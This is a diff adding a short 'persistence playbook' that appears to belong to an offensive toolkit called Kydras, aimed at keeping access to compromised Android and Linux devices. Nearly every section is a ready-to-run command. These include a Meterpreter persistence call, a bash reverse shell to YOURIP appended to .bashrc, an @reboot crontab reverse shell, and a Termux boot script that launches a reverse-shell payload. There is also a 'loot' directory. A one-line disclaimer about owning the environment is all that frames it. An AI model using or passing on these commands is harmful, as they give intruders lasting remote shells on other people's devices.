@@ -1,0 +1,33 @@
+🐉 Kydras Persistence Playbook (Mobile Edition) 🐉
+
+🎯 Objective: Maintain access post-exploitation using low-noise techniques compatible with mobile operations.
+
+---
+
+✅ 1. Basic Persistence (Android):
+- After payload session (meterpreter):
+run persistence -X -i 30 -p 4444 -r YOURIP
+- ✅ Auto-reconnect on boot every 30 sec
+
+✅ 2. Bash Reverse Shell Persistence (Linux/Unix):
+echo "bash -i >& /dev/tcp/YOURIP/4444 0>&1" >> ~/.bashrc
+
+✅ 3. Crontab Persistence (Linux):
+echo "@reboot bash -i >& /dev/tcp/YOURIP/4444 0>&1" | crontab -
+
+✅ 4. Termux Autostart (Mobile):
+- Install termux-autostart
+pkg install termux-api termux-services -y
+termux-wake-lock
+- Create startup script:
+mkdir -p ~/.termux/boot/
+echo "bash ~/Kydras-Payloads/payloads/simple-reverse-shell.sh" > ~/.termux/boot/start.sh
+chmod +x ~/.termux/boot/start.sh
+
+✅ 5. Mobile Operator Notes:
+- Avoid noisy persistence in live environments
+- Always test persistence in isolated labs
+- Loot paths:
+~/Kydras_Loot/persistence_logs/
+
+🐉 Persist Only When You Own The Environment — Stay Smart, Stay Mobile.
